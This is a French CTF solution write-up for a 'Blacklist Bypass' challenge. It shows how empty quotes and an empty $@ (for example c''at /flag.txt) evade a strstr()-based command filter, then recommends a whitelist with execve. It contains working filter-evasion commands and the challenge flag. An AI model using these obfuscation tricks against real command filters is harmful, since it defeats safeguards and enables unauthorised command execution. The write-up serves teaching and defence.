# SOLUTION — Challenge 02 : Blacklist Bypass

## Vulnérabilité

Le filtre utilise `strstr()` pour chercher des sous-chaînes exactes dans l'input.
Il voit `cat` dans `cat /flag.txt` mais pas dans `c''at /flag.txt`.

Le shell, lui, supprime les guillemets vides **avant** d'exécuter la commande.
Résultat : le filtre est trompé, mais Bash exécute bien `cat`.

## Exploits valides

```bash
# Guillemets simples vides
./wrapper "c''at /flag.txt"

# $@ vaut chaîne vide hors d'une fonction → ca$@t = cat
./wrapper "ca\$@t /flag.txt"

# Mix des deux
./wrapper "wh''oami"

# Guillemets doubles vides
./wrapper 'c""at /flag.txt'
```

## Flag

```
HackUTT{bl4ckl1st_byp4ss_qu0t3s_w1n}
```

## Explication pédagogique

### Pourquoi les guillemets vides trompent strstr()

```bash
$ type c''at
cat is /usr/bin/cat      # Bash reconnaît "cat"

$ type ca$@t
cat is /usr/bin/cat      # $@ vaut "" → "cat"

$ type w'h'o'am'i
whoami is /usr/bin/whoami
```

Le programme C reçoit la chaîne brute `c''at` et `strstr("c''at", "cat")` retourne NULL.
Bash reçoit ensuite la même chaîne, retire les guillemets vides, et exécute `cat`.

### Tableau des techniques

| Technique       | Exemple        | Vu par strstr | Exécuté par Bash |
|-----------------|----------------|---------------|------------------|
| Guillemets vides | `c''at`       | `c''at` ❌    | `cat` ✅         |
| `$@` vide       | `ca$@t`        | `ca$@t` ❌    | `cat` ✅         |
| Mix             | `w'h'o'am'i`   | `w'h'o'am'i` ❌ | `whoami` ✅    |
| Guillemets doubles | `c""at`     | `c""at` ❌    | `cat` ✅         |

### Comment s'en protéger

Ne jamais utiliser de blacklist pour filtrer des commandes shell.
Utiliser une **whitelist stricte** ou, mieux, ne jamais appeler `system()`.

```c
// Bonne pratique : whitelist + execve sans shell
const char *allowed[] = { "date", "uptime", "hostname", NULL };
int ok = 0;
for (int i = 0; allowed[i]; i++)
    if (strcmp(input, allowed[i]) == 0) ok = 1;

if (!ok) { printf("Commande non autorisée.\n"); return 1; }

execve("/usr/bin/date", (char*[]){"/usr/bin/date", NULL}, NULL);
```
